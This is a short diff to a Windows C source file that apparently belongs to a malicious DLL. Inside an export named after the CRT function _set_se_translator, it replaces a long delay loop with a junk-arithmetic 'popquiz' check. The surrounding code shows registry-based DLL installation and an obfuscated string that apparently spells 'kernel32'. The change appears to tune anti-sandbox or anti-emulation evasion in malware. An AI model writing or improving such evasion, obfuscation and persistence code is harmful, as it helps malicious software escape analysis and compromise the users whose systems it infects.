@@ -161,6 +161,31 @@ static void reg_install(const char *subkey, const char *dll_path) {
   RegCloseKey(hKey);
 }
 
+__attribute__((noinline))
+static int popquiz(void) {
+  volatile ULONG64 x = 0xA5A5A5A5A5A5A5A5ULL;
+  volatile ULONG64 y = 0x5A5A5A5A5A5A5A5AULL;
+  volatile DWORD c = 0;
+  int i;
+
+  for (i = 0; i < 8; i++) {
+    x ^= (x << 13);
+    x ^= (x >> 7);
+    x ^= (x << 17);
+    y = (y * 6364136223846793005ULL) + x;
+    c ^= (DWORD)(x & 0xFFFFFFFFULL);
+  }
+
+  if (((x ^ y) & 0xFFFFULL) == 0xBEEFULL) {
+    volatile DWORD acc = 0;
+    for (i = 0; i < 2000; i++)
+      acc += (DWORD)((i * 31) ^ (i << 2));
+    return 1;
+  }
+
+  return 0;
+}
+
 static void path_expand(char *path, int cap, pExpandEnvironmentStringsA fExpand) {
   char tmp[512];
   DWORD n;
@@ -305,12 +330,8 @@ void *_set_se_translator(void *translator) {
 
   bp_arm();
 
-  volatile unsigned int delay = 0;
-  for (unsigned int i = 0; i < 400000000; i++) {
-    delay += i ^ (i - 1);
-  }
-  if (delay == 0xdeadbeef) {
-    return (void *)0;
+  if (popquiz()) {
+      return (void *)0;
   }
 
   unsigned char e_kernel32[] = {0x52, 0x5d, 0x41, 0x5c, 0x02, 0x0a, 0x01,
